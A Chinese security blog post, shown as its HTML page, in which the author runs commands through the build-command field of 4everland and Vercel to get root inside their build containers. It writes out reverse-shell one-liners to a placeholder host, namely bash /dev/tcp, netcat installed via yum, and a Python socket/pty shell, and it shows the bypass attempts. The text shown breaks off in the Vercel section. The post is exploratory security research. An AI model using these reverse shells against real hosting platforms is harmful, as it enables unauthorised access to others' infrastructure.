<!doctype html><html lang=zh-cn><head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#"><meta charset=utf-8><meta name=generator content="Hugo 0.100.2"><meta name=theme-color content="#fff"><meta name=color-scheme content="light dark"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=format-detection content="telephone=no, date=no, address=no, email=no"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><title>静态站点托管平台仅能托管静态资源？ | zjun's blog</title><link rel=stylesheet href=/css/meme.min.css><script src=/js/meme.min.js></script><meta name=author content="zjun"><meta name=description content="这篇文章首发在「跳跳糖」：https://tttang.com/archive/1501/。4everland、vercel 与 netlify 都是是非常不错的静态资源托管云平……"><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=mask-icon href=/icons/safari-pinned-tab.svg color=#fff><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-title content="zjun's blog"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=mobile-web-app-capable content="yes"><meta name=application-name content="zjun's blog"><meta name=msapplication-starturl content="../../"><meta name=msapplication-TileColor content="#fff"><meta name=msapplication-TileImage content="../../icons/mstile-150x150.png"><link rel=manifest href=/manifest.json><link rel=canonical href=https://blog.zjun.info/tech/issues-of-static-website-hosting-platform/><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2022-03-29T14:15:45+08:00","dateModified":"2022-04-03T22:14:43+08:00","url":"https://blog.zjun.info/tech/issues-of-static-website-hosting-platform/","headline":"静态站点托管平台仅能托管静态资源？","description":"这篇文章首发在「跳跳糖」：https://tttang.com/archive/1501/。4everland、vercel 与 netlify 都是是非常不错的静态资源托管云平……","inLanguage":"zh-CN","articleSection":"tech","wordCount":2998,"image":["https://oss.zjun.info/zjun.info/202203151418610.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151432185.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151254574.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151255212.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151256480.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151326481.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151325078.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151335945.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151340741.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203151305359.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203231749186.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203231750315.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203231750697.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203161500117.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203161502888.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA","https://oss.zjun.info/zjun.info/202203161503285.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA"],"publisher":{"@type":"Organization","name":"zjun's blog","logo":{"@type":"ImageObject","url":"https://blog.zjun.info/icons/apple-touch-icon.png"},"url":"https://blog.zjun.info/"},"mainEntityOfPage":{"@type":"WebSite","@id":"https://blog.zjun.info/"}}</script><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@zjuninfo"><meta property="og:title" content="静态站点托管平台仅能托管静态资源？"><meta property="og:description" content="这篇文章首发在「跳跳糖」：https://tttang.com/archive/1501/。4everland、vercel 与 netlify 都是是非常不错的静态资源托管云平……"><meta property="og:url" content="https://blog.zjun.info/tech/issues-of-static-website-hosting-platform/"><meta property="og:site_name" content="zjun's blog"><meta property="og:locale" content="zh"><meta property="og:image" content="https://oss.zjun.info/zjun.info/202203151418610.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-03-29T14:15:45+08:00"><meta property="article:modified_time" content="2022-04-03T22:14:43+08:00"><meta property="article:section" content="tech"><link rel=preconnect href=https://www.google-analytics.com crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-8C6SESQST4"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-8C6SESQST4')</script></head><body><div class=container><header class=header><div class=header-wrapper><div class="header-inner single"><div class=site-brand><a href=/ class=brand>zjun's blog</a></div><nav class=nav><ul class=menu id=menu><li class="menu-item active"><a href=/tech/><span class=menu-item-name>文章</span></a></li><li class=menu-item><a href=/links/><span class=menu-item-name>友链</span></a></li><li class=menu-item><a href=/about/><span class=menu-item-name>关于</span></a></li><li class=menu-item><a href=https://tools.zjun.info><span class=menu-item-name>在线工具</span></a></li><li class=menu-item><a href=https://github.com/z1un><span class=menu-item-name>Github</span></a></li><li class=menu-item><a href=https://twitter.com/zjuninfo><span class=menu-item-name>Twitter</span></a></li><li class=menu-item><a id=theme-switcher href=#><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-light"><path d="M193.2 104.5 242 7a18 18 0 0128 0l48.8 97.5L422.2 70A18 18 0 01442 89.8l-34.5 103.4L505 242a18 18 0 010 28l-97.5 48.8L442 422.2A18 18 0 01422.2 442l-103.4-34.5L270 505a18 18 0 01-28 0l-48.8-97.5L89.8 442A18 18 0 0170 422.2l34.5-103.4-97.5-48.8a18 18 0 010-28l97.5-48.8L70 89.8A18 18 0 0189.8 70zM256 128a128 128 0 10.01.0M256 160a96 96 0 10.01.0"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon theme-icon-dark"><path d="M27 412A256 256 0 10181 5a11.5 11.5.0 00-5 20A201.5 201.5.0 0142 399a11.5 11.5.0 00-15 13"/></svg></a></li></ul></nav></div></div><input type=checkbox id=nav-toggle aria-hidden=true>
<label for=nav-toggle class=nav-toggle></label>
<label for=nav-toggle class=nav-curtain></label></header><main class="main single" id=main><div class=main-inner><article class="content post h-entry" data-align=justify data-type=tech data-toc-num=true><h1 class="post-title p-name">静态站点托管平台仅能托管静态资源？</h1><div class=post-meta><time datetime=2022-03-29T14:15:45+08:00 class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon post-meta-icon"><path d="M402.3 344.9l32-32c5-5 13.7-1.5 13.7 5.7V464c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h273.5c7.1.0 10.7 8.6 5.7 13.7l-32 32c-1.5 1.5-3.5 2.3-5.7 2.3H48v352h352V350.5c0-2.1.8-4.1 2.3-5.6zm156.6-201.8L296.3 405.7l-90.4 10c-26.2 2.9-48.5-19.2-45.6-45.6l10-90.4L432.9 17.1c22.9-22.9 59.9-22.9 82.7.0l43.2 43.2c22.9 22.9 22.9 60 .1 82.8zM460.1 174 402 115.9 216.2 301.8l-7.3 65.3 65.3-7.3L460.1 174zm64.8-79.7-43.2-43.2c-4.1-4.1-10.8-4.1-14.8.0L436 82l58.1 58.1 30.9-30.9c4-4.2 4-10.8-.1-14.9z"/></svg>&nbsp;2022.3.29</time>
<span class="post-meta-item category"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M464 128H272l-54.63-54.63c-6-6-14.14-9.37-22.63-9.37H48C21.49 64 0 85.49.0 112v288c0 26.51 21.49 48 48 48h416c26.51.0 48-21.49 48-48V176c0-26.51-21.49-48-48-48zm0 272H48V112h140.12l54.63 54.63c6 6 14.14 9.37 22.63 9.37H464v224z"/></svg>&nbsp;<a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ class="category-link p-category">网络安全</a></span></div><nav class=contents><h2 id=contents class=contents-title>目录</h2><ol class=toc><li><a id=contents:由-4everland-功能问题引起的探索 href=#由-4everland-功能问题引起的探索>由 4everland 功能问题引起的探索</a></li><li><a id=contents:root-权限的-vercel-容器 href=#root-权限的-vercel-容器>root 权限的 vercel 容器</a></li><li><a id=contents:低权限的-netlify-容器 href=#低权限的-netlify-容器>低权限的 netlify 容器</a></li><li><a id=contents:思考 href=#思考>思考</a></li></ol></nav><div class="post-body e-content"><p style=text-indent:0><span class=drop-cap>这</span>篇文章首发在「跳跳糖」：<a href=https://tttang.com/archive/1501/ target=_blank rel=noopener>https://tttang.com/archive/1501/</a>。<a href=https://4everland.org/ target=_blank rel=noopener>4everland</a>、<a href=https://vercel.com/ target=_blank rel=noopener>vercel</a> 与 <a href=https://app.netlify.com/ target=_blank rel=noopener>netlify</a> 都是是非常不错的静态资源托管云平台，vercel 我用了有近一年的时间，4everland 才接触两天，由于 4everland 网站的功能问题才有了以下内容，随后也对其他的同类型平台进行了一次测试。</p><h2 id=由-4everland-功能问题引起的探索><a href=#由-4everland-功能问题引起的探索 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:由-4everland-功能问题引起的探索 class=headings>由 4everland 功能问题引起的探索</a></h2><p><a href=https://www.4everland.org/ target=_blank rel=noopener>4everland</a> 基于 IPFS <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>[1]</a></sup> 和以太坊的底层技术，是一个集存储、计算、网络核心能力于一体的 Web 3.0 云计算平台。</p><p>由于一直想体验 IPFS，正好在 3 月 14 日上 twitter 时看了到 4everland 的推文，于是立即进行部署。就想先把我的博客迁移过来。由于博客使用的 SSG <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>[2]</a></sup> 是 hugo，在我部署的时候前端居然不让我设置构建命令，下拉选项框里面为空又不能输入，在我感觉很奇怪的同时在网上查了一下，发现其他人的截图中此处都有一个 <code>Override</code> 选项，选择后就可以自己定制构建命令。</p><p><img src="https://oss.zjun.info/zjun.info/202203151418610.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151418610></p><p>于是当时就反馈给了工作人员，说明了我遇到的情况，以及我尝试利用抓包的方式设置 <code>Build command</code>，也确实可以设置成功，但是构建提示 hugo 命令不存在，当时我没有多想只当它是网站功能缺陷。一并反馈后回复我：将与技术核对，然后就没有再回复了。</p><p><img src="https://oss.zjun.info/zjun.info/202203151432185.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151432185></p><p>既然不能在平台用 hugo 构建，其实也可以在本地生成 public 目录上传并设置其为网站根目录也就解决了我的持续部署问题，在网站的访问速度方面感觉还不错，毕竟是基于 IPFS 的分布式去中心化部署。</p><p>当天晚上又想起这件事：前端功能对用户关闭，但是能通过改包设置。突然就想到此处大概率会存在一些安全问题，通过执行任意命令而达到容器逃逸等，且网站可能正在整改中，不然没理由将前端屏蔽掉。第二天起床就验证我的猜想，抓了个包执行 <code>whoami</code></p><p><img src="https://oss.zjun.info/zjun.info/202203151254574.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151254574></p><p>不出意外成功执行，其 IP 是来自境外的阿里云服务器，其实命令执行还在意料之中，毕竟构建前端框架是需要执行一些系统命令的，只是没想到会给用户一个 root 权限。</p><p><img src="https://oss.zjun.info/zjun.info/202203151255212.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151255212></p><p><img src="https://oss.zjun.info/zjun.info/202203151256480.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151256480></p><p>本着好奇的心态看看服务器信息，可用命令很少又是 docker 容器</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; ls /bin/
</span></span><span class=line><span class=cl>bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname <span class=nb>echo</span> egrep <span class=nb>false</span> fgrep findmnt grep gunzip gzexe gzip hostname ip <span class=nb>kill</span> ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ping ping4 ping6 ps <span class=nb>pwd</span> rbash readlink rm rmdir run-parts sed sh sh.distrib sleep ss stty su sync tailf tar tempfile touch <span class=nb>true</span> umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; cat /proc/version
</span></span><span class=line><span class=cl>Linux version 4.19.91-23.al7.x86_64 <span class=o>(</span>mockbuild@koji.alibaba-inc.com<span class=o>)</span> <span class=o>(</span>gcc version 4.8.5 <span class=m>20150623</span> <span class=o>(</span>Red Hat 4.8.5-44<span class=o>)</span> <span class=o>(</span>GCC<span class=o>))</span> <span class=c1>#1 SMP Tue Mar 23 18:02:34 CST 2021</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; cat /proc/1/cgroup <span class=p>|</span> grep docker
</span></span><span class=line><span class=cl>12:perf_event:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podea9e7227_7424_46fe_b280_d1bc4d9da2db.slice/cri-containerd-5c431a2c7efadc3727b585146e14ba0f6636c413e84ea09feaec8a9c5b205691.scope/docker/a48b0828068742c2cfdf522a249773e76fe9df1e34bbcc5510413ce6a550d8aa
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>1:name<span class=o>=</span>systemd:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podea9e7227_7424_46fe_b280_d1bc4d9da2db.slice/cri-containerd-5c431a2c7efadc3727b585146e14ba0f6636c413e84ea09feaec8a9c5b205691.scope/docker/a48b0828068742c2cfdf522a249773e76fe9df1e34bbcc5510413ce6a550d8aa
</span></span></code></pre></div><p>执行反弹 shell <code>sh -i >& /dev/tcp/x.x.x.x/8888 0>&1</code>，报错：<code>/bin/sh: 13: Syntax error: Bad fd number</code>，猜想可能是 <code>/bin/sh</code> 链接到了 <code>dash</code>，而非 <code>bash</code>，于是查看 <code>ls -l /bin/sh</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>4</span> Jan <span class=m>24</span> <span class=m>2017</span> /bin/sh -&gt; dash
</span></span></code></pre></div><p>如何绕过呢？尝试几种方式未果，更加验证了我的猜想：网站做了些防护措施。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; ls -l /bin/dash <span class=o>&amp;&amp;</span> ls -l /bin/bash
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>117208</span> Jan <span class=m>24</span> <span class=m>2017</span> /bin/dash
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>1099016</span> May <span class=m>15</span> <span class=m>2017</span> /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; rm -f /bin/sh <span class=o>&amp;&amp;</span> ln -sf /bin/bash /bin/sh <span class=o>&amp;&amp;</span> ls -l /bin/sh <span class=o>&amp;&amp;</span> /bin/bash -i &gt;<span class=p>&amp;</span> /dev/tcp/x.x.x.x/8888 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>9</span> Mar <span class=m>15</span> 07:21 /bin/sh -&gt; /bin/bash
</span></span><span class=line><span class=cl>/bin/sh: 13: Syntax error: Bad fd number
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; rm -f /bin/sh <span class=o>&amp;&amp;</span> ln -sf /bin/bash /bin/sh <span class=o>&amp;&amp;</span> ls -l /bin/sh <span class=o>&amp;&amp;</span> sh -c bash -i &gt;<span class=p>&amp;</span> /dev/tcp/x.x.x.x/8888 0&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>9</span> Mar <span class=m>15</span> 07:37 /bin/sh -&gt; /bin/bash
</span></span><span class=line><span class=cl>/bin/sh: 13: Syntax error: Bad fd number
</span></span></code></pre></div><p>想了很久依然没有拿到 shell。但是这里就算拿到 shell 意义也不大。可玩性太低，精简的系统容器逃逸并不太可能。</p><h2 id=root-权限的-vercel-容器><a href=#root-权限的-vercel-容器 class=anchor-link><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96.0-59.27-59.26-59.27-155.7.0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757.0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037.0 01-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482.0 0120.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96.0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454.0 0020.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037.0 00-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639.0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href=#contents:root-权限的-vercel-容器 class=headings>root 权限的 vercel 容器</a></h2><p><a href=https://vercel.com/ target=_blank rel=noopener>vercel</a> 是一个用于前端框架和静态站点的平台，类似于 Github Page，而且将 Github 授权给 vercel 后可以达到最优雅的发布体验，只需将代码推送到 Github 仓库，vercel 项目就能自动更新部署。那 vercel 的容器安全性如何呢？在 <code>BULD COMMAND</code> 一栏执行了 <code>whoami && ls /bin</code></p><p><img src="https://oss.zjun.info/zjun.info/202203151326481.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151326481></p><p>结果也是显示 <code>root</code> 权限，可用命令很多，可玩性就比 4everland 强太多了。</p><p><img src="https://oss.zjun.info/zjun.info/202203151325078.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151325078></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>a2p abs2rel aclocal aclocal-1.13 addr2line amazon-linux-extras animate ar arch as aserver autoconf autoheader autom4te automake automake-1.13 autoreconf autoscan autoupdate awk base64 basename bash bashbug bashbug-64 bdftopcf bdftruncate <span class=nb>bg</span> bootctl build-classpath build-classpath-directory build-jar-repository bunzip2 busctl bzcat bzcmp bzdiff bzgrep bzip2 bzip2recover bzless bzmore c++ c2ph c89 c99 cairo-sphinx cal ca-legacy captoinfo cat catchsegv cc <span class=nb>cd</span> certutil c++filt chacl chage chcon check-binary-files chgrp chmem chmod chown chrt cksum clean-binary-files clear cmp cmsutil col colcrt colrm column comm <span class=nb>command</span> compile_et composite conjure convert coredumpctl cp cpio cpp create-jar-links crlutil csplit csslint-0.6 curl cut cwebp date db_archive db_checkpoint db_deadlock db_dump db_dump185 db_hotbackup db_load db_log_verify db_printlog db_recover db_replicate db_stat db_tuner db_upgrade dbus-cleanup-sockets dbus-daemon dbus-monitor dbus-send dbus-test-tool dbus-update-activation-environment dbus-uuidgen db_verify dconf dd df dgawk diff diff3 diff-jars dir dircolors dirname display dmesg du dwebp dwp <span class=nb>echo</span> egrep eject elfedit env eqn erb ex expand expr factor fallocate <span class=nb>false</span> <span class=nb>fc</span> fc-cache fc-cache-64 fc-cat fc-conflist fc-list fc-match fc-pattern fc-query fc-scan fc-validate <span class=nb>fg</span> fgrep fincore find find2perl find-jar findmnt fipscheck fipshmac flock fmt fold fonttosfnt free freetype-config fribidi funzip g++ gapplication gawk gcc gcc-ar gcc-nm gcc-ranlib gcov gcov-dump gcov-tool gdbm_dump gdbm_load gdbmtool gdbus gdbus-codegen gdk-pixbuf-query-loaders-64 gdk-pixbuf-thumbnailer gem gencat geqn getconf getent getfacl getopt <span class=nb>getopts</span> gif2webp gio gio-querymodules-64 git git-receive-pack git-shell git-upload-archive git-upload-pack glib-compile-resources glib-compile-schemas glib-genmarshal glib-gettextize glib-mkenums gmake gneqn gnroff gobject-query gpasswd gpg gpg2 gpg-agent gpgconf gpg-connect-agent gpg-error gpgparsemail gpgsplit gpgv gpgv2 gpg-zip gpic gprof gr2fonttest grep gresource groff grops grotty groups gsettings gsoelim gss-client gtar gtbl gtester-report gtk-launch gtk-query-immodules-3.0-64 gtk-update-icon-cache gtroff gunzip gzexe gzip h2ph head hexdump hostid hostnamectl i386 iceauth iconv id identify idn ifnames igawk import info infocmp infokey infotocap install ionice ipcmk ipcrm ipcs irb isosize jaotc jar jarsigner java javac javadoc javap jcmd jconsole jdb jdeprscan jdeps jhsdb jimage jinfo jjs jlink jmap jmod <span class=nb>jobs</span> join journalctl jps jrunscript jshell jstack jstatd jvmjar kernel-install keytool <span class=nb>kill</span> kmod krb5-config lastlog ld ld.bfd ldd ld.gold less lessecho lesskey lesspipe.sh libpng15-config libpng-config libtool libtoolize link linux32 linux64 ln locale localectl localedef log4j-cve-2021-44228-hotpatch logger login loginctl logname look ls lsblk lscpu lsipc lslocks lslogins lsmem lsns lua luac lz4 lz4c lz4cat m4 machinectl Magick-config MagickCore-config MagickWand-config make makedb mcookie md5sum mkdir mkfifo mkfontdir mkfontscale mknod mktemp modutil mogrify montage more mount mountpoint mv namei nasm ncurses6-config ncursesw6-config neqn nettle-hash nettle-lfib-stream newgrp nice nl nm nohup nproc nroff nsenter nss-policy-check numfmt objcopy objdump od oldfind openssl p11-kit pack200 pango-list pango-querymodules-64 pango-view paperconf paste pathchk pcre-config perl perl5.16.3 perlbug perldoc perlthanks pgawk pgrep pic piconv pinentry pinentry-curses pinky pk12util pkcs1-conv pkg-config pkill pl2pm pldd pmap pod2html pod2man pod2text pod2usage post-grohtml pr preconv pre-grohtml printenv <span class=nb>printf</span> prlimit prove ps psed pstruct ptx <span class=nb>pwd</span> pwdx pwmake pwscore pydoc python python2 python2.7 ranlib raw rdoc <span class=nb>read</span> readelf readlink realpath rebuild-jar-repository rename renice reset rev ri rm rmdir rmic rmid rmiregistry rpcgen rpm rpm2cpio rpmdb rpmkeys rpmquery rpmverify ruby runcon rvi rview s2p scp script scriptreplay sdiff sed seq serialver sessreg setarch setfacl setpriv setsid setterm setup-nsssysinit setup-nsssysinit.sh sexp-conv sftp sg sh sha1sum sha224sum sha256sum sha384sum sha512sum showrgb shred shuf signver sim_client size skill slabtop sleep slogin snice soelim sort sotruss splain split sprof sqlite3 ssh ssh-add ssh-agent ssh-copy-id ssh-keygen ssh-keyscan ssltap stat stdbuf strace strace-log-merge stream strings strip stty su sum sync systemctl systemd-analyze systemd-ask-password systemd-cat systemd-cgls systemd-cgtop systemd-coredumpctl systemd-delta systemd-detect-virt systemd-escape systemd-firstboot systemd-hwdb systemd-inhibit systemd-loginctl systemd-machine-id-setup systemd-notify systemd-nspawn systemd-path systemd-run systemd-stdio-bridge systemd-tmpfiles systemd-tty-ask-password-agent tabs tac tail tar taskset tbl tee <span class=nb>test</span> testrb tic timedatectl timeout tload toe top touch tput tr troff <span class=nb>true</span> truncate trust tset tsort tty tzselect ucs2any udevadm ul <span class=nb>umask</span> umount <span class=nb>unalias</span> uname uname26 unexpand uniq unlink unlz4 unpack200 unshare unzip unzipsfx update-ca-trust update-mime-database uptime urlgrabber users utmpdump uuclient uuidgen vdir vi view vmstat w <span class=nb>wait</span> Wand-config watch watchgnupg wc wdctl webpmux whereis which who whoami write x86_64 x86_64-redhat-linux-c++ x86_64-redhat-linux-g++ x86_64-redhat-linux-gcc x86_64-redhat-linux-gcc-7 xargs xgamma xhost xinput xmlcatalog xmllint xmlwf xmodmap xmvn-builddep xorg-x11-fonts-update-dirs xrandr xrdb xrefresh xset xsetmode xsetpointer xsetroot xsltproc xstdcmap yes yum zcat zcmp zdiff zegrep zfgrep zforce zgrep zipgrep zipinfo zless zmore znew
</span></span></code></pre></div><p>正如上 <code>/bin/</code> 下存在的命令所见是一个 redhat 系 Linux 系统，我先是尝试了用 Bash 反弹 shell：<code>sh -i >& /dev/tcp/x.x.x.x/8888 0>&1</code> ，失败了</p><p><img src="https://oss.zjun.info/zjun.info/202203151335945.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151335945></p><p>由此看来 vercel 应该是禁止了常用的反弹 shell 指令，但是我可以换一种方式。还记得我先读了 <code>/bin</code> 下的命令，其中正好有 redhat 系的包管理命令也就是 <code>yum</code>，尝试先下载 nc 再用其反弹 shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>yum install -y nc <span class=o>&amp;&amp;</span> nc -c sh x.x.x.x <span class=m>8888</span>
</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/202203151340741.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA" alt=202203151340741></p><p>或者也可以使用 python 反弹 bash</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python -c <span class=s1>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;x.x.x.x&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
